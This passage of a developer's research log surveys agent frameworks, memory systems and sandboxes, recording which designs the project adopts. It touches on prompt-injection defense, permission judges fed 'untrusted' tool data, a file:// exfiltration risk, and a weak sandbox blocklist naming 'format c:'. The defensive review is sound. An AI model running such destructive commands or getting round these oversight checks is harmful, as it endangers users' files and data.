  isolated-execution reference is wanted; it is the one event-sourced agent runtime among the
  repos so far.

#### Adopted

| Item | Source | Decision |
|---|---|---|
| ACP (Agent Client Protocol) — JSON-RPC over stdio to Claude Code / Codex / Gemini CLI as subprocesses; a client-side injection point for any of them | `docs/ACP_AGENTS.md` | D83 |

#### Notes

- `docs/DefenseClaw.md`: a governance layer that scans skills and MCP servers before they run.
  D52 says we are the third party; run the shipped MCP server through it before the Phase 0
  ship.
- `AGENTS.md`'s repository map — four repos, one dependency direction, a CI guard against
  bypassing the typed client — is a good model for the day this project has more than one repo
  (kernel signed separately, D2).

### e2b-dev/E2B

- **Where:** `~/Documents/shravan/fde-ai/references/E2B` — `github.com/e2b-dev/E2B`
- **What:** SDKs (Python, JS) for cloud Firecracker microVM sandboxes: `create / connect / fork
  / pause / kill`, `files / commands / pty / git`, templates, volumes, secrets. Self-hostable
  infra; the SDK is for the hosted service. **Built, commercial.**
- **Read:** 2026-09-18 — README, SDK surface, `spec/README.md`.
- **Yield:** not adopted. Wrong shape — the Builder's code runs against the user's own files and
  credentials, which a remote sandbox does not have; D68's local container stands. The API
  vocabulary is a good interface for the local executor, and `fork` + `pause` are the primitives
  a mission would want per step and across a D78 wait.

### browserless/browserless

- **Where:** `~/Documents/shravan/fde-ai/references/browserless` — `github.com/browserless/browserless`
- **What:** Headless Chrome/Firefox/WebKit in Docker with a token-authenticated CDP/WebSocket
  API, session timeouts, concurrency limits, ad-blocking, `ALLOW_FILE_PROTOCOL` off by default.
  **Built, commercial + OSS.**
- **Read:** 2026-09-18 — README, `src/config.ts`.
- **Yield:** not adopted now. A candidate image for R3's browser sidecar — pithagoras's
  `design/agent-browser.md` remains the design of record, and browserless supplies the
  headless half but not the persistent logged-in profile or the allowlist proxy that design
  requires. Keep `ALLOW_FILE_PROTOCOL=false`: a `file://` read from the agent's browser is a
  local-file exfiltration channel.

## Tooling, protocols & local abstractions

### andrewyng/aisuite

- **Where:** `~/Documents/shravan/fde-ai/references/aisuite` — `github.com/andrewyng/aisuite`
- **What:** Two layers: a unified chat-completions API across providers keyed by a
  `provider:model` string, and an agents API with tools, toolkits, MCP and tool policies.
  openworker runs on it. **Built, PyPI.**
- **Read:** 2026-09-18 — README, `aisuite/provider.py`, `aisuite/client.py`,
  `aisuite/agents/policies.py`.

#### Adopted

| Item | Source | Decision |
|---|---|---|
| `provider:model` as the routing key; aisuite as the provider layer | `aisuite/client.py`, `aisuite/provider.py` | D87 |

#### Not adopted

| Item | Why |
|---|---|
| `RequireApprovalPolicy(callback)` for approvals | A callback cannot suspend a run; D78's inbox is the approval path. |
| The agents/runner layer | The host harness is the loop (D48). |

### modelcontextprotocol/servers

- **Where:** `~/Documents/shravan/fde-ai/references/servers` — `github.com/modelcontextprotocol/servers`
- **What:** The seven reference MCP servers maintained by the steering group — everything,
  fetch, filesystem, git, memory, sequentialthinking, time. Explicitly *"educational examples,
  not production-ready."*
- **Read:** 2026-09-18 — README, `src/memory/`, `src/filesystem/README.md`.

#### Adopted

| Item | Source | Decision |
|---|---|---|
| Hot tier as an MCP **Resource** (`memory://…`) with `notifications/resources/updated` on change | `src/memory/README.md` §Resources, `src/memory/index.ts` | D83 |
| `roots` protocol: the client's roots replace server-side scope wholesale on `roots/list_changed` | `src/filesystem/README.md` | D83 |

#### Not adopted

| Item | Why |
|---|---|
| The memory server's model — mutable entities/relations/observations, delete tools, full-file rewrite | D8. And its recommended prompt — *"Always begin your chat by saying only 'Remembering…' and retrieve"* — is the tool-pull pattern D54 rejected, recommended by the protocol's own maintainers. Quote it. |

#### Notes

- `src/memory/index.ts`'s write path is the D80 rule for derived files, with the reason
  spelled out: temp file in the *same directory* so the rename stays on one filesystem
  (`EXDEV` otherwise), `fs.writeFile` would truncate before writing, `rename(2)` is atomic.

---

# Batch 3 — 2026-09-18

The two OpenHands siblings recommended in Batch 2.

## Isolated execution & async task sandboxes (continued)

### OpenHands/software-agent-sdk

- **Where:** `~/Documents/shravan/fde-ai/references/software-agent-sdk` — `github.com/OpenHands/software-agent-sdk`
- **What:** Four packages — `openhands-sdk` (agent, event log, conversation, condenser,
  security, hooks, LLM), `openhands-tools`, `openhands-workspace` (Local / Docker / Apptainer /
  Kubernetes agent-sandbox / cloud), `openhands-agent-server` (REST + WebSocket). Immutable
  Pydantic components, one mutable conversation state, event-sourced. **Built, shipping, large
  team, benchmarked.**
- **Read:** 2026-09-18 — `AGENTS.md` (root and `sdk/`), `.agents/skills/design-principles.md`,
  `scripts/event_sourcing_benchmarks/README.md`, `sdk/conversation/event_store.py`,
  `persistence_const.py`, `state.py` (`get_unmatched_actions`), `stuck_detector.py`,
  `sdk/event/base.py`, `event/condenser.py`, `context/condenser/README.md`, `sdk/security/*`
  (risk, confirmation policy, ensemble, llm analyzer, shell parser), `sdk/hooks/config.py`,
  `openhands-workspace/**/README.md`, `docker/`.
- **Why it matters here:** the closest built cousin to §5 — append-only log, fold, snapshot
  events, crash recovery from the log — with a schema-evolution policy we lacked and published
  persist/replay numbers.

#### Adopted

| Item | Source | Decision |
|---|---|---|
| Old events must always load: permanent deprecation handlers, never `extra="forbid"` without one, golden fixtures per version with `__expected__` sentinel maps, test named for the last version with the structure, CI compat check against the last published baseline | `openhands-sdk/openhands/sdk/AGENTS.md` §Event Type Deprecation Policy, `.github/scripts/check_persisted_settings_compat.py` | D88 |
| `Condensation` event with `forgotten_event_ids`, `summary`, `summary_offset`, `llm_response_id`; folded by `View`; older-half strategy tuned for prompt cache; soft vs hard triggers | `sdk/event/condenser.py`, `sdk/context/condenser/README.md` | D89 |
| Hook event vocabulary identical to Claude Code's; hook types command / prompt / agent | `sdk/hooks/config.py` (`HOOK_EVENT_FIELDS`, `HookType`) | D90 |
| Unmatched-action detection on resume (reverse scan for actions without observation / reject / error); stuck-pattern detection as a fold; time-to-recover as a metric | `sdk/conversation/state.py`, `stuck_detector.py`, benchmarks README §4 | D91 |
| Ensemble analyzer = worst-case fusion; `ConfirmRisky(confirm_unknown=True)`; LLM self-rated risk only as one analyzer | `sdk/security/ensemble.py`, `confirmation_policy.py`, `llm_analyzer.py` | confirms D76 |
| "Stateless by default, one source of truth for state … enables deterministic replay" | `.agents/skills/design-principles.md` | confirms D8 |

#### Not adopted

| Item | Why |
|---|---|
| One JSON file per event, index from `event-{idx:05d}-{uuid}.json` filenames, `.eventlog-len-N.marker` sidecar | Avoids torn lines entirely at the cost of a directory listing per rebuild. JSONL stays — greppable and `cat`-able is D10's argument — and D80 handles the torn line. |
| Event tree via `parent_id` | Linear streams. Possibly what a mission fork wants later (D67); it is what E2B's `fork` would map onto. |
| Sandbox opt-in; unisolated agent by default | D68 makes the container the default for Builder output. Their isolated mode runs the *whole agent server* inside the sandbox — the stronger shape; remember for Phase 2. |
| `DockerWorkspace` as the executor reference | No hardening flags. pithagoras's executor is the reference; Apptainer is a rootless local option. |
| The SDK itself, agent server, tools package | The host harness is the loop (D48). |

#### Notes

- **Benchmarks are the model for D69's measured numbers**: median persist 0.17 ms/event under
  a file lock, 0.36 ms per action cycle, replay linear (100 events ≈ 2 ms), payload median
  1.5 KB — from 433 real conversations. Report the same four metrics for our log.
- **Tree-sitter-bash** (`sdk/security/shell_parser.py`) shared by tools and security so both
  see one parse. What D74's regexes grow into.
- **Public-API policy**: deprecate ≥ 5 minor releases before removal, CI-enforced
  (`check_sdk_api_breakage.py`, `check_deprecations.py`). Needed for the MCP surface once
  strangers install it (D53).
- **Design principle 1, "optional isolation over mandatory sandboxing"**, is the opposite call
  from D68 and both are defensible; theirs optimizes developer ergonomics, ours a
  non-technical user's blast radius.
- Their root `AGENTS.md` maps four repos with one dependency direction and a CI guard against
  bypassing the typed client — the shape for the day the kernel is a separate signed repo (D2).

### OpenHands/automation

- **Where:** `~/Documents/shravan/fde-ai/references/automation` — `github.com/OpenHands/automation`
- **What:** The scheduler and dispatcher for OpenHands Cloud: cron and webhook automations,
  Postgres with `FOR UPDATE SKIP LOCKED` for multi-worker dispatch, per-user API keys, run
  history, a watchdog for stale runs, an encrypted per-automation KV store for sync cursors,
  cosmetic phase reporting. **Built, beta, cloud-scale.**
- **Read:** 2026-09-18 — README, `docs/kv-store-design.md`, `docs/run-phase-reporting.md`,
  `openhands/automation/dispatcher.py`, `exceptions.py`, `app.py` (watchdog).

#### Adopted

| Item | Source | Decision |
|---|---|---|
| The question "where does a connector keep its cursor?" — answered here as a fold over the log, not a store | `docs/kv-store-design.md` §Problem Statement | D92 |

#### Not adopted

| Item | Why |
|---|---|
| Postgres scheduler, `SKIP LOCKED`, multi-worker dispatch, per-user API keys | One machine; D79's scheduler stands. |
| Encrypted per-automation KV store | D92 — the log is the cursor. Their reasoning about *why* git is the wrong place for a cursor is right and worth reading. |

#### Notes

- Watchdog marks stale `RUNNING` runs `FAILED` — pithagoras's *interrupted* status as a
  janitor. `SKIPPED` (transient, automation stays enabled) is distinct from `FAILED`
  (permanent, automation disabled); D79's overlap-skip should carry the same distinction.
- Phase reports are *"cosmetic, best-effort telemetry … a failed phase POST must never fail
  your automation."* The same asymmetry as D63's silence rule, applied to progress.

---

# Batch 4 — 2026-09-19

Fifteen repos from the first run of the sourcing prompt, verified via the API (step 0) before
cloning. Grouped by the gap they answered. Where a search model's "read this first" path did
not exist, the real path is given.

## Gap 1 — dedicated memory systems

### getzep/graphiti

- **Where:** `~/Documents/shravan/fde-ai/references/graphiti` — 31k stars, active. The OSS core of Zep.
- **What:** Temporal knowledge graph for agents: entities, edges (facts) with bi-temporal
  validity, episodes as provenance; LLM-driven extraction, dedup and invalidation; Neo4j /
  FalkorDB / Kùzu drivers; hybrid search. Paper: arXiv 2501.13956.
- **Read:** `graphiti_core/edges.py` (`EntityEdge`), `graphiti_core/nodes.py` (`EpisodicNode`),
  `graphiti_core/utils/maintenance/edge_operations.py` (`resolve_edge_contradictions`).

| Adopted | Source | Decision |
|---|---|---|
| Two time axes: `created_at`/`expired_at` (transaction) and `valid_at`/`invalid_at` (world); `reference_time` from the episode | `edges.py:263-285` | D93 |
| Contradiction only on overlapping validity; later-valid fact closes the earlier window — a pure rule once candidates are chosen | `edge_operations.py:538-573` | D93 |
| Episode = raw data + `valid_at` + the edges it produced | `nodes.py:318` | note (our `observation` with `caused_by` reversed) |

**Not adopted:** the LLM write path and the graph databases (D8, D34, D35).

### letta-ai/letta

- **Where:** `~/Documents/shravan/fde-ai/references/letta` — 25k stars. **This repo is the legacy server**; active
  development is in `letta-ai/letta-code`.
- **What:** MemGPT's successor. Memory as in-context *blocks* (`persona`, `human`, …) with
  per-block char limits, plus archival/recall stores; now a **git-backed memory filesystem**
  (`$MEMORY_DIR/system/*.md`) rendered into context with a `<projection>` path per section.
- **Read:** `letta/schemas/memory.py` (`Memory._render_memory_blocks_git`,
  `ContextWindowOverview`), `letta/schemas/block.py`.

| Adopted | Source | Decision |
|---|---|---|
| Memory delivered as files the user can open, rendered into context with the file path | `memory.py:206-260` | confirms D50, D54, D64 |
| Per-section token accounting of the resident context | `memory.py:23-66` (`ContextWindowOverview`) | note → D69's table |
| Per-block char `limit`; `read_only` blocks | `block.py:20,36` | note → D81 |

**Not adopted:** in-place block mutation (D8); git as the record (see Session 6 rejected table).

### plastic-labs/honcho

- **Where:** `~/Documents/shravan/fde-ai/references/honcho` — 7k stars, active. FastAPI + Postgres/pgvector.
- **What:** "Memory infrastructure for stateful agents": peers (humans *and* agents), sessions,
  a background *deriver* that turns messages into conclusions, a *dreamer* that consolidates
  on a schedule, representations keyed by `(observer, observed)`.
- **Read:** `README.md` §Core Concepts, `src/dreamer/orchestrator.py`,
  `src/dreamer/dream_due.py`, `src/dreamer/surprisal.py`, `tests/deriver/README.md`. (The search
  model's `src/honcho/core/session.py` does not exist.)

| Adopted | Source | Decision |
|---|---|---|
| Conclusion levels explicit / deductive / inductive | `src/config.py` (`INCLUDE_LEVELS`), dreamer specialists | D94 |
| Representations keyed by `(observer, observed)`; self is `observer == observed` | README §Core Concepts, `tests/deriver/README.md` | D94 |
| Consolidation gate: idle timeout + minimum new + min-hours since last | `src/dreamer/dream_due.py:35-113` | D95 |
| Surprisal sampling to choose what to reason about | `src/dreamer/surprisal.py` | deferred with D34; note |

**Not adopted:** the hosted service and Postgres store.

### thedotmack/claude-mem — the Phase 0 competitor

- **Where:** `~/Documents/shravan/fde-ai/references/claude-mem` — 94k stars, active, commercial (hosted "CMEM Pro"
  observer, cloud sync).
- **What:** Persistent memory for Claude Code (and Cursor, OpenCode, OpenClaw…) via five
  lifecycle hooks, a Bun worker daemon, SQLite + FTS5 + Chroma, an LLM "observer" that
  compresses every `PostToolUse` into an observation, a web viewer, four MCP search tools.
  Automatic; no human gate.
- **Read:** `docs/public/hooks-architecture.mdx`, `docs/public/architecture-evolution.mdx`
  (the lessons), `docs/public/architecture/database.mdx`.

| Adopted | Source | Decision |
|---|---|---|
| Session id changes every turn — never key on it | `architecture-evolution.mdx` "Session ID Chaos" | D101 |
| Nine MCP tools ≈ 2,500 tokens of schema and a confused model → four, with the workflow as a tool; index-first cut context 87% | `architecture-evolution.mdx` "MCP Architecture Simplification", "Realization 1" | D102 |
| `SessionStart` injects silently via `hookSpecificOutput.additionalContext` (Claude Code ≥ 2.1.0) | `hooks-architecture.mdx` | note → D54 mechanism |
| Observation types `decision` / `bugfix` / `security_alert` / `sensitive` | README, `database.mdx` | note → compare with §5.2 |

**Not adopted:** the daemon, Chroma, cloud sync, paid observer, per-tool-call LLM compression,
and the absence of a review gate — this is the design D49/D50/D56 are the counter to. Worth
quoting in the article as the state of the art it improves on.

## Gap 2 — Claude Code transcript format

### daaain/claude-code-log

- **Where:** `~/Documents/shravan/fde-ai/references/claude-code-log` — 1.2k stars, active. Python.
- **What:** Converts `~/.claude/projects/*/*.jsonl` to HTML/Markdown; strongly-typed Pydantic
  models of every entry type; DAG-based ordering.
- **Read:** `claude_code_log/models.py` (`BaseTranscriptEntry` and the entry union),
  `dev-docs/dag.md`, `claude_code_log/dag.py`.

| Adopted | Source | Decision |
|---|---|---|
| Entry shape: `uuid`, `parentUuid`, `isSidechain`, `sessionId`, `cwd`, `version`, `timestamp`, `agentId`; types user / assistant / summary / system / queue-operation | `models.py:226-336` | D101 |
| Order is the `parentUuid` DAG, not timestamps; junction points mark resume/fork | `dev-docs/dag.md` | D101 |
| Loader skips lines whose model validation fails | `models.py:270-272` | confirms D80 |

### simonw/claude-code-transcripts

- **Where:** `~/Documents/shravan/fde-ai/references/claude-code-transcripts` — 1.7k stars. Small.
- **What:** Simon Willison's transcript-to-HTML tool; a second, independent reading of the
  format. Background post linked from the README.
- **Yield:** agrees with claude-code-log on the shape; nothing further.

## Gap 3 — event sourcing in Python

### pyeventsourcing/eventsourcing

- **Where:** `~/Documents/shravan/fde-ai/references/eventsourcing` — 1.7k stars, active, mature.
- **What:** Event-sourced aggregates with snapshots, upcasting, application-level encryption
  and compression, notification logs and tracking records for exactly-once projections; SQLite
  and Postgres recorders.
- **Read:** `eventsourcing/persistence.py` (mapper, `upcast_v{n}_v{n+1}` chain ~L435,
  `Notification`, `TrackingRecorder`), `eventsourcing/domain.py` (`mutate`, `Snapshot`),
  `eventsourcing/cipher.py`.

| Adopted | Source | Decision |
|---|---|---|
| Per-type `class_version` and a chain of upcasters run on load | `persistence.py:431-438`, `domain.py:1864-1866` | D96 (amends D88) |
| Tracking record per projection → incremental rebuild | `persistence.py:648-710` | D96 |
| Cipher/compressor seam in the mapper — where the per-subject key goes | `persistence.py:330-360`, `cipher.py` | note → D12 |

**Not adopted:** the aggregate framework and DCB.

## Gap 4 — prompt-injection defense

### google-research/camel-prompt-injection

- **Where:** `~/Documents/shravan/fde-ai/references/camel-prompt-injection` — 390 stars; research artifact for
  "Defeating Prompt Injections by Design" (arXiv 2503.18813), unmaintained by its own note.
- **What:** A privileged LLM writes a program; a quarantined LLM parses untrusted data; an
  interpreter tracks `(sources, readers)` capabilities through data flow; policies check tool
  arguments against them.
- **Read:** `src/camel/capabilities/capabilities.py`, `sources.py`, `readers.py`,
  `src/camel/security_policy.py`.

| Adopted | Source | Decision |
|---|---|---|
| Capabilities = provenance sources + allowed readers, checked at the tool call | `capabilities.py:20-36` | D97 (integrity computed from `caused_by`) |

**Not adopted:** the interpreter.

## Gap 5 — memory evals

### xiaowu0162/LongMemEval

- **Where:** `~/Documents/shravan/fde-ai/references/LongMemEval` — 1.1k stars; ICLR 2025; V2 (agentic) exists.
- **What:** 500 questions over timestamped multi-session histories testing extraction,
  multi-session reasoning, knowledge updates, temporal reasoning, abstention; LLM-judged
  scoring.
- **Read:** `README.md` (question taxonomy ~L81-136), `src/evaluation/evaluate_qa.py`.

| Adopted | Source | Decision |
|---|---|---|
| The five abilities as a capability corpus; the scoring harness | README, `evaluate_qa.py` | D98 |

### snap-research/locomo

- **Where:** `~/Documents/shravan/fde-ai/references/locomo` — 1.2k stars; ACL 2024; static since 2024.
- **What:** Ten very-long conversations annotated for QA and event summarization
  (`data/locomo10.json`).
- **Yield:** second capability corpus, D98.

## Gap 6 — pseudonymization

### data-privacy-stack/presidio (was microsoft/presidio)

- **Where:** `~/Documents/shravan/fde-ai/references/presidio` — 11k stars, active.
- **What:** PII *analyzer* (NER + recognizers + context) and *anonymizer* (operators: replace,
  mask, redact, hash, encrypt/decrypt, custom) with a deanonymize engine.
- **Read:** `presidio-anonymizer/presidio_anonymizer/operators/` — `hash.py`, `encrypt.py`,
  `custom.py`. (The search model's `operators/crypto.py` does not exist.)
- **Yield:** the analyzer is the detection engine for D18; the stable `PERSON_A` token comes
  from our own append-only mapping stream behind a `custom` operator. Salted hash is stable
  but neither readable nor a mapping — not the pseudonym. Phase 1.

## Gap 7 — reflection and promotion gates

### MineDojo/Voyager

- **Where:** `~/Documents/shravan/fde-ai/references/Voyager` — 7k stars; last commit 2023.
- **What:** Lifelong Minecraft agent with a skill library; a critic verifies task success
  before a skill is added; retrieval over skill descriptions.
- **Read:** `voyager/agents/skill.py` (`add_new_skill`), `voyager/agents/critic.py`
  (`human_check_task_success`).
- **Yield:** confirmation of D20 stage 1 with a human `Success? (y/n)` gate in the loop;
  nothing new.

## Gap 8 — permission models in shipping harnesses

### aaif-goose/goose (was block/goose)

- **Where:** `~/Documents/shravan/fde-ai/references/goose` — 54k stars, active. Rust.
- **What:** Block's agent; permission modes including "smart approve" — an LLM judge classifies
  pending tool requests as read-only; MCP `readOnlyHint` honored directly; per-tool
  AlwaysAllow / AskBefore / NeverAllow.
- **Read:** `crates/goose/src/permission/permission_judge.rs`, `permission_inspector.rs`
  (`apply_tool_annotations`), `crates/goose/src/config/permission.rs`.

| Item | Source | Verdict |
|---|---|---|
| `readOnlyHint` as a permission input in a shipping harness | `permission_inspector.rs:52-68` | confirms D84 |
| Judge input labeled "UNTRUSTED TOOL REQUEST DATA" | `permission_judge.rs:91-118` | consistent with D76 rule 3 |
| **All pending requests batched into one judge call** | `permission_judge.rs:91-118` | **not adopted** — the shape D76 invariant 2 forbids |

### openai/codex

- **Where:** `~/Documents/shravan/fde-ai/references/codex` — 125k stars, active. Rust, 8k files.
- **What:** OpenAI's terminal agent. Relevant crates: `codex-rs/sandboxing` (seatbelt, bwrap,
  landlock, policy transforms, violations), `codex-rs/linux-sandbox`, `codex-rs/execpolicy`
  (the command-policy engine). `docs/sandbox.md` only links out.
- **Read:** `codex-rs/execpolicy/README.md`, `codex-rs/sandboxing/src/seatbelt_base_policy.sbpl`,
  `codex-rs/sandboxing/src/` listing. (No `default.rules` in the tree; the README's examples
  are the reference.)

| Adopted | Source | Decision |
|---|---|---|
| Seatbelt `(deny default)` on macOS, bwrap + landlock on Linux; policy inspired by Chrome's | `seatbelt_base_policy.sbpl` | D99 |
| Rules carry `justification` and load-validated `match` / `not_match` examples; `forbidden` names the alternative; `host_executable` path constraint | `execpolicy/README.md` | D100 |

## Gap 9 — local sandbox

### anthropics/sandbox-runtime (was anthropic-experimental/sandbox-runtime)

- **Where:** `~/Documents/shravan/fde-ai/references/sandbox-runtime` — 5k stars, active. TypeScript. Built for
  Claude Code, released as a research preview.
- **What:** `srt` — OS-level sandbox without a container: `sandbox-exec` on macOS, bubblewrap
  on Linux, allow-only network through a proxy with a resolved-address check, filesystem
  allow/deny, violation monitoring, model-facing denial reasons. Headline use case: sandboxing
  MCP servers.
- **Read:** `README.md` (all of it — the configuration section is the design), `src/sandbox/`.

| Adopted | Source | Decision |
|---|---|---|
| OS sandbox as the laptop default; container as opt-in | README §Overview | D99 |
| Resolved-address check: resolve once, drop denied classes, dial the survivor | README §Network Configuration | D99 |
| `deniedDomainReasons` — the model is told what is blocked and the sanctioned alternative | README | D99, D100 |
| Ship the MCP server with an `srt` profile and test under it | README §Sandboxing MCP Servers | D99 |

---

# Batch 5 — 2026-10-10

## NousResearch/hermes-agent

- **Where:** `~/Documents/shravan/fde-ai/references/hermes-agent` — 18k files, active (0d3b0348, 2026-10-10).
- **What:** *"The self-improving AI agent"* — a full harness: TUI, gateway to Telegram /
  Discord / Slack / WhatsApp / Signal, agent-curated memory with pluggable providers, autonomous
  skill creation, a skill curator, FTS5 session search, cron automations, subagents, seven
  terminal backends (local → Docker → SSH → Modal → Daytona → Vercel Sandbox), Honcho for user
  modeling. Nous Research.
- **Why it matters:** named in Session 1 as one of the harnesses this project was defined
  against; now the closest *built* thing to the full §4+§11 vision. Read for what its loops do,
  not for its shape.
- **Read:** `agent/curator.py`, `agent/memory_manager.py`, `agent/memory_provider.py`, README.

| Adopted | Source | Decision |
|---|---|---|
| Background jobs bind the caller's context through one helper; an empty context *"silently lands on the default profile"* | `agent/memory_provider.py` — `ctx_bound`, `spawn_context_thread` | **D113** — the process-level hole in D32 |
| Deterministic prune always runs; the LLM consolidation fork is opt-in and off by default | `agent/curator.py:33` | D114 |
| Never delete, only archive (recoverable); `pinned` bypasses every auto-transition; only curator-managed items are touched | `agent/curator.py:5-6` | D114 |
| A skill a cron job references is treated as pinned — *"paused/rare jobs would age them out"* | `agent/curator.py:219` | D114 (dependency-aware retirement) |
| The background fork uses the auxiliary client and *"never touches the main session's prompt cache"* | `agent/curator.py:6` | D114 (R1) |
| Thresholds: interval 7 d, min idle 2 h, stale 14 d, archive 30 d | `agent/curator.py:31` | D114 |
| Prefetch timeout, background sync, `flush_pending(timeout)` — slow memory degrades a turn, never hangs it | `agent/memory_manager.py:398,511,631,674` | D115 |
| ONE external memory provider at a time, *"tool-schema bloat"* | `agent/memory_manager.py:3` | confirms D102 |
| Memory goes into the system prompt (`build_system_prompt`) | `agent/memory_manager.py:501` | confirms D54 |
| Versioned pre-compaction checkpoint, fail-closed at v2 | `agent/memory_provider.py` (`PRE_COMPRESS_CHECKPOINT_API_VERSION`) | note — we are immune, we read the file |
| A visible per-turn recall indicator (`RecallStatus`) | `agent/memory_provider.py` | note → D50 |

**Not adopted:** Hermes as a harness (D48); pluggable memory backends (D10); unprompted skill
creation (Phase 2, behind D117 + D20); the seven terminal backends (D99, D68).

**Note:** `hermes_state_*.py` is ~40 modules around one SQLite file — FTS, WAL, rewind,
timeline, compression, lock guards, repair, portability. The surface area a database grows when
it is the record rather than an index.

## iamlukethedev/Herald-OS

- **Where:** `~/Documents/shravan/fde-ai/references/Herald-OS` — 1.3k files, alpha 0.1 (7babe0c, 2026-10-10).
- **What:** An agent-native desktop OS with Hermes as its interface — Electron shell, system
  bridge plugin, sandboxed UI plugins, a Fedora-bootc Linux build. Independent of Nous.
- **Read:** `docs/DECISIONS.md` (21 ADRs), `docs/ARCHITECTURE.md`, `docs/internal/LANDSCAPE.md`.
- **Memory:** none of its own — deferred entirely to Hermes. Its yield is the permission model.

| Adopted | Source | Decision |
|---|---|---|
| Destructive actions take a per-call `rule_key` so *"'always' cannot persist for them"* | ADR-005 | D116 |
| One approval gate for every mutating path — one card, one allowlist, one audit trail | ADR-005 | confirms D62, D78 |
| Installed disabled; enabling grants what the manifest asks *then*; a manifest that asks for more turns it off until re-agreed | ADR-019 | D117 |
| *"Hermes can install, update and remove plugins but not turn them on"* | ADR-019 | D117 |

**Not adopted:** the OS (D48, D53); sandboxed UI plugin frames (no UI to plug into).

**Surveyed and declined, from its `LANDSCAPE.md`:** agiresearch/AIOS, SomaOS, naia-os, openneo,
vinos, tensoragentos, macagentos, sai — the agent-OS category. Not cloning; the shape is
settled (D48).

## titechprabhasolutions/Brahma-Ai-Evo

- **Where:** `~/Documents/shravan/fde-ai/references/Brahma-Ai-Evo` — 283 files, ~61k lines of Python, 22 commits
  between 2026-09-29 and 2026-10-01 (e0bd3c5, read 2026-10-11). 46★.
- **What:** A Windows-only voice assistant in the "JARVIS" style: PyQt6 + WebEngine UI,
  Gemini 2.5 Live native audio, ~60 action modules (Spotify, office files, 3D globe, smart home,
  Arduino circuit display, Android call screener), LLM-written "skills" and a runtime
  self-patcher. `ui.py` (15k lines) and `main.py` (5.4k lines) hold about a quarter of the code.
- **License:** source-available, non-commercial, redistribution prohibited. **No code can enter
  `walle` (MIT); ideas only.**
- **Read:** README, `memory/memory_manager.py`, `core/learned_rules.py`, `core/confirm.py`,
  `core/undo.py`, `core/skill_crucible.py`, `core/skill_forge.py`, `core/sensorium.py`,
  `actions/auto_heal_engine.py`.

Nothing adopted. Every row below is an observation, not a commitment (D70).

| Observation | Source | Bears on |
|---|---|---|
| The confirmation token comes from the UI, never the model: a `confirmed=yes` tool parameter is *"a convention, not a gate"* | `core/confirm.py` (module docstring) | confirms D73, D74; a good line for the article |
| Act at once and push an undo; ask only before the irreversible. *"An assistant that checks with you before turning the volume down is one you stop talking to"* | `core/undo.py` (module docstring) | candidate input to the approval-fatigue risk (PLAN §5) at Phase 2–3; not adopted |
| Storage limit and prompt budget used to be one number, so the whole store sat in the prompt and was silently evicted at the cap (*"quietly forgot your sister's name"*). Now split: a ~900-char core in the prompt plus a `recall_memory` tool | `memory/memory_manager.py` (comment above `MEMORY_MAX_CHARS`) | real-world evidence for the hot-tier / `recall` split (D54, D64) |
| Passive window, dwell and idle monitor, polled every 3 s | `core/sensorium.py` | a crude Observation loop; irrelevant to Phase 0, whose observer is the transcript (D101) |

**Not adopted:**
- Memory and learned rules as mutable JSON, rewritten in place (`memory/memory_manager.py`,
  `core/learned_rules.py`). No provenance, no `why`, no rebuild. Conflicts with principle 2
  and D10.
- The runtime self-patcher: an LLM rewrites Brahma's own source from a traceback, with
  backups and a protected-file list (`actions/auto_heal_engine.py`). Conflicts with principle 1
  (immutable kernel).
- The "Crucible" sandbox (`core/skill_crucible.py`): a substring blocklist (`"format c:"`,
  `"system32"`) followed by a plain subprocess on the host Python, with pip install allowed.
  Not isolation; same failure as Arcturus's executor. D68 and D99 stand.
- Auto-registering forged skills into `features/` with no cap. Conflicts with principle 5
  (WIP cap) and D117 (installed disabled).
- The standalone-harness shape and feature breadth. This is the "bloat" the README argues
  against, and the full-harness path PLAN §2 and D48 rejected.

**Note:** Voice is the only area where it is ahead of this plan (Phase 4), and it is tied to
Gemini Live and Windows. Not worth a re-read unless it grows an event log or real isolation.
